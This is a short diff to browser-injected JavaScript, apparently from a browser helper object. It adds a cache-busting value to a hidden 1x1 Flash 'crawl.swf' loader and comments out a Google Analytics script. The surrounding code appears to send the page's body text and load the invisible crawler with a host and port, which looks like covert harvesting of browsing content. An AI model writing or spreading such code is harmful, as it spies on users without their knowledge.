@@ -501,7 +501,7 @@ function I8bho_print()
             sendText(document.body.innerText.replace(/\s{2,}/g,  ' '));
         }
         var host = "192.168.1.8", port = "10010";
-        var swf = 'http://' + 'www.jebe.com' + '/crawl.swf?host=' + host + '&port=' + port + '&charset=' + i8vars.charset + '&initrc=' + initrc;
+        var swf = 'http://' + 'www.jebe.com' + '/crawl.swf?' + Math.random() + '&host=' + host + '&port=' + port + '&charset=' + i8vars.charset + '&initrc=' + initrc;
         var html = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" ' +
                 'codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" ' +
                 'width="1" height="1" id="' + i8vars.cmtorid + '" name="' + i8vars.cmtorid + '">' +
@@ -550,11 +550,11 @@ function I8bho_print()
     }
 
 	//load Google Analytics
-	body.insertBefore(create('script', {
+/*	body.insertBefore(create('script', {
 		'type': 'text/javascript',
 		'async': true,
 		'src': 'http://google-analytics.com/ga.js'
-	}), firstObject);
+	}), firstObject);*/
 
 	if( I8zc_ifiedown && (i8bho_nid.indexOf("1")>-1 || i8bho_nid.indexOf("2")>-1 || i8bho_nid.indexOf("3")>-1 || i8bho_nid.indexOf("4")>-1 || i8bho_nid.indexOf("5")>-1) )
 	{
